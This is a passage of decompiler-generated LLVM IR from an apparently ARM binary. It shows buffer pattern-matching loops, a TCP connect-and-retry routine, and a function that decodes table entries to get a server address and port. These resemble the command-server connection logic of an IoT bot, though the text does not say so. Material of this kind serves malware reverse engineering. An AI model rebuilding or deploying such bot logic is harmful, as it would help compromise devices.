  br i1 %v5_f008, label %dec_label_pc_f018, label %dec_label_pc_f0c4.lr.ph

dec_label_pc_f0c4.lr.ph:                          ; preds = %dec_label_pc_effc
  %v1_f0bc70 = add i32 %v0_f084105, -1
  store i32 %v1_f0bc70, i32* %r1.global-to-local, align 4
  %v0_f0c4.pre = load i32, i32* @r5, align 4
  %v1_f0c8.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_f0c4

dec_label_pc_f018:                                ; preds = %dec_label_pc_f0bc.backedge, %dec_label_pc_effc
  %v3_f01c = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_f01c, i32* @r4, align 4
  %v5_f024 = icmp slt i32 %v0_f084105, %v3_f01c
  br i1 %v5_f024, label %dec_label_pc_f034, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_f018
  %v1_f0f079 = add i32 %v0_f084105, -1
  store i32 %v1_f0f079, i32* %r1.global-to-local, align 4
  %v2_f0f080 = icmp eq i32 %v0_f084105, 0
  br i1 %v2_f0f080, label %dec_label_pc_f034, label %dec_label_pc_f0f8.lr.ph

dec_label_pc_f0f8.lr.ph:                          ; preds = %.thread28
  %v0_f0f8.pre = load i32, i32* @r6, align 4
  %v1_f0fc.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_f0f8

dec_label_pc_f034:                                ; preds = %dec_label_pc_f0f0.backedge, %.thread28, %dec_label_pc_f018
  store i32 %v2_eb00, i32* %r1.global-to-local, align 4
  %v3_f038 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f038, i32* @r4, align 4
  %v5_f040 = icmp slt i32 %v0_f084105, %v3_f038
  br i1 %v5_f040, label %dec_label_pc_f050, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_f034
  %v1_f12488 = add i32 %v0_f084105, -1
  store i32 %v1_f12488, i32* %r1.global-to-local, align 4
  %v2_f12489 = icmp eq i32 %v0_f084105, 0
  br i1 %v2_f12489, label %dec_label_pc_f050, label %dec_label_pc_f12c.lr.ph

dec_label_pc_f12c.lr.ph:                          ; preds = %.thread37
  %v0_f12c.pre = load i32, i32* @sb, align 4
  %v1_f130.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_f12c

dec_label_pc_f050:                                ; preds = %dec_label_pc_f124.backedge, %.thread37, %dec_label_pc_f034
  store i32 %v2_eb00, i32* %r2.global-to-local, align 4
  %v3_f054 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_f054, i32* @r4, align 4
  %v5_f05c = icmp slt i32 %v0_f084105, %v3_f054
  br i1 %v5_f05c, label %dec_label_pc_f06c, label %.thread46

.thread46:                                        ; preds = %dec_label_pc_f050
  %v1_f15897 = add i32 %v0_f084105, -1
  store i32 %v1_f15897, i32* %r1.global-to-local, align 4
  %v2_f15898 = icmp eq i32 %v0_f084105, 0
  br i1 %v2_f15898, label %dec_label_pc_f06c, label %dec_label_pc_f160.lr.ph

dec_label_pc_f160.lr.ph:                          ; preds = %.thread46
  %v0_f160.pre = load i32, i32* @fp, align 4
  %v1_f164.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_f160

dec_label_pc_f06c:                                ; preds = %dec_label_pc_f158.backedge, %.thread46, %dec_label_pc_f050
  store i32 %v2_eb00, i32* %r3.global-to-local, align 4
  %v3_f070 = load i32, i32* %stack_var_-56, align 4
  %v5_f078 = icmp slt i32 %v0_f084105, %v3_f070
  br i1 %v5_f078, label %dec_label_pc_efe4.backedge, label %.thread52

dec_label_pc_efe4.backedge:                       ; preds = %dec_label_pc_f0a8, %.thread52, %dec_label_pc_f06c
  store i32 %v2_ebfc, i32* %r1.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v4_eff0 = call i32 @function_13864(i32 %v3_ef4c, i32* nonnull %stack_var_-8408, i32 4096)
  %tmp218 = icmp slt i32 %v4_eff0, 1
  br i1 %tmp218, label %dec_label_pc_f208, label %dec_label_pc_effc

.thread52:                                        ; preds = %dec_label_pc_f06c
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_f084107 = icmp eq i32 %v0_f084105, 0
  br i1 %v2_f084107, label %dec_label_pc_efe4.backedge, label %dec_label_pc_f08c.lr.ph

dec_label_pc_f08c.lr.ph:                          ; preds = %.thread52
  %v1_f094.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_f08c

dec_label_pc_f08c:                                ; preds = %dec_label_pc_f0a8, %dec_label_pc_f08c.lr.ph
  %v0_f084.in = phi i32 [ %v0_f084105, %dec_label_pc_f08c.lr.ph ], [ %v0_f084, %dec_label_pc_f0a8 ]
  %v0_f0a8 = phi i32 [ 0, %dec_label_pc_f08c.lr.ph ], [ %v1_f0a8, %dec_label_pc_f0a8 ]
  %v0_f09c = phi i32 [ 0, %dec_label_pc_f08c.lr.ph ], [ %v1_f09c., %dec_label_pc_f0a8 ]
  %v0_f084 = add i32 %v0_f084.in, -1
  store i32 %v3_efdc, i32* %r3.global-to-local, align 4
  %v2_f090 = add i32 %v0_f09c, %v3_efdc
  %v3_f090 = inttoptr i32 %v2_f090 to i8*
  %v4_f090 = load i8, i8* %v3_f090, align 1
  %v6_f090 = zext i8 %v4_f090 to i32
  store i32 %v6_f090, i32* %r2.global-to-local, align 4
  %v2_f094 = add i32 %v0_f0a8, %v1_f094.pre
  %v3_f094 = inttoptr i32 %v2_f094 to i8*
  %v4_f094 = load i8, i8* %v3_f094, align 1
  %v6_f094 = zext i8 %v4_f094 to i32
  store i32 %v6_f094, i32* %r3.global-to-local, align 4
  %v9_f098 = icmp eq i8 %v4_f094, %v4_f090
  %v1_f09c = add i32 %v0_f09c, 1
  %v1_f09c. = select i1 %v9_f098, i32 %v1_f09c, i32 0
  store i32 %v1_f09c., i32* %r1.global-to-local, align 4
  br i1 %v9_f098, label %dec_label_pc_f180, label %dec_label_pc_f0a8

dec_label_pc_f0a8:                                ; preds = %dec_label_pc_f180, %dec_label_pc_f08c
  %v1_f0a8 = add i32 %v0_f0a8, 1
  %v2_f084 = icmp eq i32 %v0_f084, 0
  br i1 %v2_f084, label %dec_label_pc_efe4.backedge, label %dec_label_pc_f08c

dec_label_pc_f0b0:                                ; preds = %dec_label_pc_f0c4
  %v9_f0b0 = icmp eq i32 %v3_f000, %v1_f0d0.
  br i1 %v9_f0b0, label %dec_label_pc_f188, label %dec_label_pc_f0bc.backedge

dec_label_pc_f0bc.backedge:                       ; preds = %dec_label_pc_f0c4, %dec_label_pc_f0b0
  %storemerge125 = add i32 %storemerge125.in, 1
  %v1_f0bc = add i32 %v0_f0bc, -1
  store i32 %v1_f0bc, i32* %r1.global-to-local, align 4
  %v2_f0bc = icmp eq i32 %v0_f0bc, 0
  br i1 %v2_f0bc, label %dec_label_pc_f018, label %dec_label_pc_f0c4

dec_label_pc_f0c4:                                ; preds = %dec_label_pc_f0bc.backedge, %dec_label_pc_f0c4.lr.ph
  %v0_f0bc = phi i32 [ %v1_f0bc70, %dec_label_pc_f0c4.lr.ph ], [ %v1_f0bc, %dec_label_pc_f0bc.backedge ]
  %storemerge125.in = phi i32 [ 0, %dec_label_pc_f0c4.lr.ph ], [ %storemerge125, %dec_label_pc_f0bc.backedge ]
  %v0_f0d0 = phi i32 [ 0, %dec_label_pc_f0c4.lr.ph ], [ %v1_f0d0., %dec_label_pc_f0bc.backedge ]
  %v2_f0c4 = add i32 %v0_f0d0, %v0_f0c4.pre
  %v3_f0c4 = inttoptr i32 %v2_f0c4 to i8*
  %v4_f0c4 = load i8, i8* %v3_f0c4, align 1
  %v6_f0c4 = zext i8 %v4_f0c4 to i32
  store i32 %v6_f0c4, i32* %r2.global-to-local, align 4
  %v2_f0c8 = add i32 %storemerge125.in, %v1_f0c8.pre
  %v3_f0c8 = inttoptr i32 %v2_f0c8 to i8*
  %v4_f0c8 = load i8, i8* %v3_f0c8, align 1
  %v6_f0c8 = zext i8 %v4_f0c8 to i32
  store i32 %v6_f0c8, i32* %r3.global-to-local, align 4
  %v9_f0cc = icmp eq i8 %v4_f0c8, %v4_f0c4
  %v1_f0d0 = add i32 %v0_f0d0, 1
  %v1_f0d0. = select i1 %v9_f0cc, i32 %v1_f0d0, i32 0
  br i1 %v9_f0cc, label %dec_label_pc_f0b0, label %dec_label_pc_f0bc.backedge

dec_label_pc_f0e4:                                ; preds = %dec_label_pc_f0f8
  %v9_f0e4 = icmp eq i32 %v3_f01c, %v1_f104.
  br i1 %v9_f0e4, label %dec_label_pc_f188, label %dec_label_pc_f0f0.backedge

dec_label_pc_f0f0.backedge:                       ; preds = %dec_label_pc_f0f8, %dec_label_pc_f0e4
  %storemerge124 = add i32 %storemerge124.in, 1
  %v1_f0f0 = add i32 %v0_f0f0, -1
  store i32 %v1_f0f0, i32* %r1.global-to-local, align 4
  %v2_f0f0 = icmp eq i32 %v0_f0f0, 0
  br i1 %v2_f0f0, label %dec_label_pc_f034, label %dec_label_pc_f0f8

dec_label_pc_f0f8:                                ; preds = %dec_label_pc_f0f0.backedge, %dec_label_pc_f0f8.lr.ph
  %v0_f0f0 = phi i32 [ %v1_f0f079, %dec_label_pc_f0f8.lr.ph ], [ %v1_f0f0, %dec_label_pc_f0f0.backedge ]
  %storemerge124.in = phi i32 [ 0, %dec_label_pc_f0f8.lr.ph ], [ %storemerge124, %dec_label_pc_f0f0.backedge ]
  %v0_f104 = phi i32 [ 0, %dec_label_pc_f0f8.lr.ph ], [ %v1_f104., %dec_label_pc_f0f0.backedge ]
  %v2_f0f8 = add i32 %v0_f104, %v0_f0f8.pre
  %v3_f0f8 = inttoptr i32 %v2_f0f8 to i8*
  %v4_f0f8 = load i8, i8* %v3_f0f8, align 1
  %v6_f0f8 = zext i8 %v4_f0f8 to i32
  store i32 %v6_f0f8, i32* %r2.global-to-local, align 4
  %v2_f0fc = add i32 %storemerge124.in, %v1_f0fc.pre
  %v3_f0fc = inttoptr i32 %v2_f0fc to i8*
  %v4_f0fc = load i8, i8* %v3_f0fc, align 1
  %v6_f0fc = zext i8 %v4_f0fc to i32
  store i32 %v6_f0fc, i32* %r3.global-to-local, align 4
  %v9_f100 = icmp eq i8 %v4_f0fc, %v4_f0f8
  %v1_f104 = add i32 %v0_f104, 1
  %v1_f104. = select i1 %v9_f100, i32 %v1_f104, i32 0
  br i1 %v9_f100, label %dec_label_pc_f0e4, label %dec_label_pc_f0f0.backedge

dec_label_pc_f118:                                ; preds = %dec_label_pc_f12c
  %v9_f118 = icmp eq i32 %v3_f038, %v1_f138.
  br i1 %v9_f118, label %dec_label_pc_f188, label %dec_label_pc_f124.backedge

dec_label_pc_f124.backedge:                       ; preds = %dec_label_pc_f12c, %dec_label_pc_f118
  %storemerge123 = add i32 %storemerge123.in, 1
  %v1_f124 = add i32 %v0_f124, -1
  store i32 %v1_f124, i32* %r1.global-to-local, align 4
  %v2_f124 = icmp eq i32 %v0_f124, 0
  br i1 %v2_f124, label %dec_label_pc_f050, label %dec_label_pc_f12c

dec_label_pc_f12c:                                ; preds = %dec_label_pc_f124.backedge, %dec_label_pc_f12c.lr.ph
  %v0_f124 = phi i32 [ %v1_f12488, %dec_label_pc_f12c.lr.ph ], [ %v1_f124, %dec_label_pc_f124.backedge ]
  %storemerge123.in = phi i32 [ 0, %dec_label_pc_f12c.lr.ph ], [ %storemerge123, %dec_label_pc_f124.backedge ]
  %v0_f138 = phi i32 [ 0, %dec_label_pc_f12c.lr.ph ], [ %v1_f138., %dec_label_pc_f124.backedge ]
  %v2_f12c = add i32 %v0_f138, %v0_f12c.pre
  %v3_f12c = inttoptr i32 %v2_f12c to i8*
  %v4_f12c = load i8, i8* %v3_f12c, align 1
  %v6_f12c = zext i8 %v4_f12c to i32
  store i32 %v6_f12c, i32* %r2.global-to-local, align 4
  %v2_f130 = add i32 %storemerge123.in, %v1_f130.pre
  %v3_f130 = inttoptr i32 %v2_f130 to i8*
  %v4_f130 = load i8, i8* %v3_f130, align 1
  %v6_f130 = zext i8 %v4_f130 to i32
  store i32 %v6_f130, i32* %r3.global-to-local, align 4
  %v9_f134 = icmp eq i8 %v4_f130, %v4_f12c
  %v1_f138 = add i32 %v0_f138, 1
  %v1_f138. = select i1 %v9_f134, i32 %v1_f138, i32 0
  br i1 %v9_f134, label %dec_label_pc_f118, label %dec_label_pc_f124.backedge

dec_label_pc_f14c:                                ; preds = %dec_label_pc_f160
  %v9_f14c = icmp eq i32 %v3_f054, %v1_f16c.
  br i1 %v9_f14c, label %dec_label_pc_f188, label %dec_label_pc_f158.backedge

dec_label_pc_f158.backedge:                       ; preds = %dec_label_pc_f160, %dec_label_pc_f14c
  %storemerge = add i32 %storemerge.in, 1
  %v1_f158 = add i32 %v0_f158, -1
  store i32 %v1_f158, i32* %r1.global-to-local, align 4
  %v2_f158 = icmp eq i32 %v0_f158, 0
  br i1 %v2_f158, label %dec_label_pc_f06c, label %dec_label_pc_f160

dec_label_pc_f160:                                ; preds = %dec_label_pc_f158.backedge, %dec_label_pc_f160.lr.ph
  %v0_f158 = phi i32 [ %v1_f15897, %dec_label_pc_f160.lr.ph ], [ %v1_f158, %dec_label_pc_f158.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_f160.lr.ph ], [ %storemerge, %dec_label_pc_f158.backedge ]
  %v0_f16c = phi i32 [ 0, %dec_label_pc_f160.lr.ph ], [ %v1_f16c., %dec_label_pc_f158.backedge ]
  %v2_f160 = add i32 %v0_f16c, %v0_f160.pre
  %v3_f160 = inttoptr i32 %v2_f160 to i8*
  %v4_f160 = load i8, i8* %v3_f160, align 1
  %v6_f160 = zext i8 %v4_f160 to i32
  store i32 %v6_f160, i32* %r2.global-to-local, align 4
  %v2_f164 = add i32 %storemerge.in, %v1_f164.pre
  %v3_f164 = inttoptr i32 %v2_f164 to i8*
  %v4_f164 = load i8, i8* %v3_f164, align 1
  %v6_f164 = zext i8 %v4_f164 to i32
  store i32 %v6_f164, i32* %r3.global-to-local, align 4
  %v9_f168 = icmp eq i8 %v4_f164, %v4_f160
  %v1_f16c = add i32 %v0_f16c, 1
  %v1_f16c. = select i1 %v9_f168, i32 %v1_f16c, i32 0
  br i1 %v9_f168, label %dec_label_pc_f14c, label %dec_label_pc_f158.backedge

dec_label_pc_f180:                                ; preds = %dec_label_pc_f08c
  %v9_f180 = icmp eq i32 %v3_f070, %v1_f09c.
  br i1 %v9_f180, label %dec_label_pc_f188, label %dec_label_pc_f0a8

dec_label_pc_f188:                                ; preds = %dec_label_pc_f0b0, %dec_label_pc_f0e4, %dec_label_pc_f118, %dec_label_pc_f14c, %dec_label_pc_f180
  %v1_f18c = call i32 @function_122f8(i32 12)
  %v1_f194 = call i32 @function_122f8(i32 13)
  %v1_f19c = call i32 @function_122f8(i32 14)
  %v1_f1a4 = call i32 @function_122f8(i32 15)
  %v1_f1ac = call i32 @function_122f8(i32 16)
  %v1_f1b4 = call i32 @function_1369c(i32 %v3_ef4c)
  %v0_f1b8 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_f1c0 = call i32 @function_1379c(i32 %v0_f1b8, i32 9)
  br label %dec_label_pc_f1c4

dec_label_pc_f1c4:                                ; preds = %dec_label_pc_ef40, %dec_label_pc_f208, %dec_label_pc_f188
  store i32 64, i32* %r1.global-to-local, align 4
  %v2_f1d0 = call i32 @function_12d7c(i32 %v2_edc0, i32 64)
  store i32 64, i32* %r1.global-to-local, align 4
  %v2_f1e0 = call i32 @function_12d7c(i32 %v2_ee10, i32 64)
  %v1_f1e8 = call i32 @function_14ac4(i32 1)
  store i32 %v2_ed94, i32* @r4, align 4
  %v0_f1f0 = load i32, i32* @r7, align 4
  store i32 %v0_f1f0, i32* @r5, align 4
  br label %dec_label_pc_ecf4.backedge

dec_label_pc_f1f8:                                ; preds = %dec_label_pc_ef20
  %v0_f1f8 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_f200 = call i32 @function_1379c(i32 %v0_f1f8, i32 9)
  %v0_ef38.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ef38

dec_label_pc_f208:                                ; preds = %dec_label_pc_efe4.backedge, %dec_label_pc_ef5c
  %v1_f20c = call i32 @function_122f8(i32 12)
  %v1_f214 = call i32 @function_122f8(i32 13)
  %v1_f21c = call i32 @function_122f8(i32 14)
  %v1_f224 = call i32 @function_122f8(i32 15)
  %v1_f22c = call i32 @function_122f8(i32 16)
  %v1_f234 = call i32 @function_1369c(i32 %v3_ef4c)
  br label %dec_label_pc_f1c4

; uselistorder directives
  uselistorder i32 %v1_f16c., { 1, 0 }
  uselistorder i1 %v9_f168, { 1, 0 }
  uselistorder i32 %v0_f16c, { 1, 0 }
  uselistorder i32 %v1_f138., { 1, 0 }
  uselistorder i1 %v9_f134, { 1, 0 }
  uselistorder i32 %v0_f138, { 1, 0 }
  uselistorder i32 %v1_f104., { 1, 0 }
  uselistorder i1 %v9_f100, { 1, 0 }
  uselistorder i32 %v0_f104, { 1, 0 }
  uselistorder i32 %v1_f0d0., { 1, 0 }
  uselistorder i1 %v9_f0cc, { 1, 0 }
  uselistorder i32 %v0_f0d0, { 1, 0 }
  uselistorder i32 %v1_f09c., { 1, 2, 0 }
  uselistorder i1 %v9_f098, { 1, 0 }
  uselistorder i32 %v0_f09c, { 1, 0 }
  uselistorder i32 %v0_f0a8, { 1, 0 }
  uselistorder i32 %v4_eff0, { 1, 0 }
  uselistorder i32 %v3_ef4c, { 3, 2, 4, 1, 0 }
  uselistorder i32 %v3_ef28, { 1, 2, 0 }
  uselistorder i32 %v2_ecf8, { 1, 0 }
  uselistorder i32 %stack_var_-8420.1.be, { 1, 0 }
  uselistorder i32 %v4_ee70, { 1, 2, 0 }
  uselistorder i32 %v2_ed78, { 1, 0 }
  uselistorder i32 %v1_ed28, { 0, 1, 5, 4, 3, 2, 7, 8, 6 }
  uselistorder i32 %stack_var_-8420.0, { 1, 0 }
  uselistorder i32 %v2_ee10, { 1, 0, 2 }
  uselistorder i32 %v2_edc0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_ec8c, { 1, 0 }
  uselistorder i32 %v3_ec58, { 2, 0, 1 }
  uselistorder i32 %v2_ebfc, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v3_eb88, { 2, 1, 0 }
  uselistorder i32 %v3_eb38, { 1, 2, 0 }
  uselistorder i32 %storemerge174, { 1, 0 }
  uselistorder i32 %v0_eac8, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32* %stack_var_-72, { 0, 3, 1, 4, 2 }
  uselistorder i32* %stack_var_-8408, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 1, 0, 2 }
  uselistorder i32* %stack_var_-56, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 19, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 61, 12, 60, 59, 11, 1, 0, 58, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 27, 26, 28, 29, 30, 32, 31, 33, 34, 35, 37, 36, 38, 39, 40, 62, 41, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32 (i8*, i32, i32)* @function_13030, { 0, 1, 2, 3, 4, 5, 6, 21, 22, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 (i32*)* @function_13ba0, { 4, 3, 0, 5, 6, 7, 2, 8, 1 }
  uselistorder i32 (i32)* @function_13aa4, { 2, 1, 0 }
  uselistorder i32* @global_var_1ecbc.105, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_1ecc0.97, { 0, 2, 1 }
  uselistorder label %dec_label_pc_f1c4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f188, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_effc, { 1, 0 }
  uselistorder label %dec_label_pc_ef40, { 1, 0 }
  uselistorder label %dec_label_pc_ef38, { 1, 0 }
  uselistorder label %dec_label_pc_ecf4.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_eedc, { 1, 0 }
  uselistorder label %dec_label_pc_ed04, { 1, 0 }
  uselistorder label %dec_label_pc_ed04.preheader, { 1, 0 }
  uselistorder label %bb216, { 1, 0 }
  uselistorder label %dec_label_pc_ebb4, { 1, 0 }
  uselistorder label %dec_label_pc_eb64, { 1, 0 }
}

define i32 @function_f248() local_unnamed_addr {
dec_label_pc_f248:
  store i32 ptrtoint (i32* @global_var_f3d0.107 to i32), i32* @global_var_1ea90.109, align 4
  %v1_f254 = load i32, i32* @r0, align 4
  ret i32 %v1_f254
}

define i32 @function_f260() local_unnamed_addr {
dec_label_pc_f260:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_f260 = load i32, i32* @r4, align 4
  %v9_f260 = load i32, i32* @r6, align 4
  %v15_f260 = load i32, i32* @r8, align 4
  store i32 1, i32* @r4, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_f27c = call i32 @function_13f90(i32 2, i32 1, i32 0)
  store i32 ptrtoint (i32* @global_var_1ea88.111 to i32), i32* @r6, align 4
  %v7_f284 = icmp eq i32 %v3_f27c, -1
  store i32 %v3_f27c, i32* @global_var_1ea88.111, align 4
  br i1 %v7_f284, label %dec_label_pc_f344, label %dec_label_pc_f290

dec_label_pc_f290:                                ; preds = %dec_label_pc_f260
  %v0_f294 = load i32, i32* @r4, align 4
  %v6_f2a4 = call i32 @function_13f60(i32 %v3_f27c, i32 %v0_f294, i32 2, i32* nonnull %stack_var_-28, i32 4)
  %v2_f2a8 = load i32, i32* @global_var_1ea88.111, align 4
  store i32 %v2_f2a8, i32* @r4, align 4
  store i32 0, i32* @r2, align 4
  %v2_f2b8 = call i32 @function_135ac(i32 %v2_f2a8, i32 3)
  %v1_f2c0 = or i32 %v2_f2b8, 2048
  store i32 %v1_f2c0, i32* @r2, align 4
  %v0_f2c4 = load i32, i32* @r4, align 4
  %v2_f2c8 = call i32 @function_135ac(i32 %v0_f2c4, i32 4)
  store i32 ptrtoint (i8** @global_var_1ea94.113 to i32), i32* @r8, align 4
  %v2_f2d0 = load i8, i8* bitcast (i8** @global_var_1ea94.113 to i8*), align 4
  %v2_f2d4 = icmp eq i8 %v2_f2d0, 0
  br i1 %v2_f2d4, label %.thread2, label %.thread

.thread2:                                         ; preds = %dec_label_pc_f290
  br label %bb

.thread:                                          ; preds = %dec_label_pc_f290
  br label %bb

bb:                                               ; preds = %.thread2, %.thread
  store i32 0, i32* @r5, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v0_f30c = call i32 @function_13c70()
  %v0_f310 = load i32, i32* @r5, align 4
  %v2_f310 = inttoptr i32 %v0_f30c to i32*
  store i32 %v0_f310, i32* %v2_f310, align 4
  %v2_f314 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_f314, i32* @r7, align 4
  store i32 %v0_f30c, i32* @r4, align 4
  %v2_f320 = load i32, i32* @global_var_1ea88.111, align 4
  %v3_f328 = bitcast i32* %stack_var_-44 to %sockaddr*
  %v4_f328 = call i32 @function_13dc0(i32 %v2_f320, %sockaddr* %v3_f328, i32 16)
  %v7_f32c = icmp eq i32 %v4_f328, -1
  br i1 %v7_f32c, label %dec_label_pc_f34c, label %dec_label_pc_f334

dec_label_pc_f334:                                ; preds = %bb
  %v2_f33c = load i32, i32* @global_var_1ea88.111, align 4
  %v2_f340 = call i32 @function_13e74(i32 %v2_f33c, i32 1)
  br label %dec_label_pc_f344

dec_label_pc_f344:                                ; preds = %dec_label_pc_f260, %dec_label_pc_f358, %dec_label_pc_f334
  %v20_f348 = phi i32 [ %v3_f27c, %dec_label_pc_f260 ], [ %v0_f3a8, %dec_label_pc_f358 ], [ %v2_f340, %dec_label_pc_f334 ]
  store i32 %v3_f260, i32* @r4, align 4
  store i32 %v9_f260, i32* @r6, align 4
  store i32 %v15_f260, i32* @r8, align 4
  ret i32 %v20_f348

dec_label_pc_f34c:                                ; preds = %bb
  %v0_f34c = load i32, i32* @r4, align 4
  %v1_f34c = inttoptr i32 %v0_f34c to i32*
  %v2_f34c = load i32, i32* %v1_f34c, align 4
  %v7_f350 = icmp eq i32 %v2_f34c, 99
  br i1 %v7_f350, label %dec_label_pc_f3b0, label %dec_label_pc_f358

dec_label_pc_f358:                                ; preds = %dec_label_pc_f3b0, %bb21, %dec_label_pc_f34c
  store i32 0, i32* @r4, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v2_f370 = load i32, i32* @global_var_1ea88.111, align 4
  %v4_f388 = call i32 @function_13dec(i32 %v2_f370, %sockaddr* %v3_f328, i32 16)
  %v1_f390 = call i32 @function_14ac4(i32 5)
  %v2_f394 = load i32, i32* @global_var_1ea88.111, align 4
  %v1_f398 = call i32 @function_1369c(i32 %v2_f394)
  %v1_f3a4 = call i32 @function_e544(i32 58811)
  %v0_f3a8 = call i32 @function_f260()
  br label %dec_label_pc_f344

dec_label_pc_f3b0:                                ; preds = %dec_label_pc_f34c
  %v2_f3b0 = load i8, i8* bitcast (i8** @global_var_1ea94.113 to i8*), align 4
  %v3_f3b0 = zext i8 %v2_f3b0 to i32
  %v1_f3b4 = load i32, i32* @r5, align 4
  %v9_f3b4 = icmp eq i32 %v3_f3b0, %v1_f3b4
  br i1 %v9_f3b4, label %dec_label_pc_f358, label %bb21

bb21:                                             ; preds = %dec_label_pc_f3b0
  %v2_f3bc = trunc i32 %v1_f3b4 to i8
  store i8 %v2_f3bc, i8* bitcast (i8** @global_var_1ea94.113 to i8*), align 4
  br label %dec_label_pc_f358

; uselistorder directives
  uselistorder i32 %v3_f27c, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0, 3, 2 }
  uselistorder i32 (i32)* @function_e544, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_13e74, { 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_1ea94.113 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_1ea94.113, { 1, 0 }
  uselistorder label %dec_label_pc_f358, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f344, { 1, 2, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_f3d0() local_unnamed_addr {
dec_label_pc_f3d0:
  %stack_var_-16 = alloca i32, align 4
  %v3_f3d0 = load i32, i32* @r4, align 4
  store i32 %v3_f3d0, i32* %stack_var_-16, align 4
  %v1_f3d8 = call i32 @function_123b0(i32 3)
  %v3_f3e4 = call i32 @function_122cc(i32 3, i32* null)
  %v1_f3e8 = inttoptr i32 %v3_f3e4 to i8*
  %v2_f3e8 = call i32 @function_10144(i8* %v1_f3e8)
  store i32 %v2_f3e8, i32* @r5, align 4
  %v1_f3f4 = call i32 @function_122f8(i32 3)
  %v0_f3f8 = load i32, i32* @r5, align 4
  %v2_f3f8 = icmp eq i32 %v0_f3f8, 0
  store i32 ptrtoint (i8** @global_var_1ecc4.116 to i32), i32* @r6, align 4
  br i1 %v2_f3f8, label %bb, label %bb5

bb:                                               ; preds = %dec_label_pc_f3d0
  ret i32 %v1_f3f4

bb5:                                              ; preds = %dec_label_pc_f3d0
  %v1_f404 = add i32 %v0_f3f8, 4
  %v2_f404 = inttoptr i32 %v1_f404 to i32*
  %v3_f404 = load i32, i32* %v2_f404, align 4
  store i32 %v3_f404, i32* @r4, align 4
  %v0_f408 = call i32 @function_fe60()
  %v0_f40c = load i32, i32* @r5, align 4
  %v1_f40c = inttoptr i32 %v0_f40c to i8*
  %v2_f40c = load i8, i8* %v1_f40c, align 1
  %v3_f40c = zext i8 %v2_f40c to i32
  %v2_f410 = call i32 @function_133f8(i32 %v0_f408, i32 %v3_f40c)
  %v0_f414 = load i32, i32* @r4, align 4
  %v4_f414 = mul i32 %v2_f410, 4
  %v5_f414 = add i32 %v0_f414, %v4_f414
  %v6_f414 = inttoptr i32 %v5_f414 to i32*
  %v7_f414 = load i32, i32* %v6_f414, align 4
  %v0_f418 = load i32, i32* @r5, align 4
  store i32 %v7_f414, i32* @global_var_1ecc8.117, align 4
  %v1_f420 = call i32 @function_10120(i32 %v0_f418)
  %v1_f428 = call i32 @function_123b0(i32 4)
  %v3_f434 = call i32 @function_122cc(i32 4, i32* null)
  %v4_f434 = inttoptr i32 %v3_f434 to i8*
  %v2_f438 = add i32 %v3_f434, 1
  %v3_f438 = inttoptr i32 %v2_f438 to i8*
  %v4_f438 = load i8, i8* %v3_f438, align 1
  %v3_f43c = load i8, i8* %v4_f434, align 1
  store i8 %v4_f438, i8* bitcast (i32* @global_var_1ecc7.118 to i8*), align 4
  store i8 %v3_f43c, i8* bitcast (i32* @global_var_1ecc6.119 to i8*), align 4
  %v2_f454 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_f454, i32* @r4, align 4
  %v1_f458 = call i32 @function_122f8(i32 4)
  %v0_f45c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f45c, label %bb6, label %bb7

bb6:                                              ; preds = %bb5
  br label %bb7

bb7:                                              ; preds = %bb5, %bb6
  ret i32 %v1_f458

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @function_f460(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_f460:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
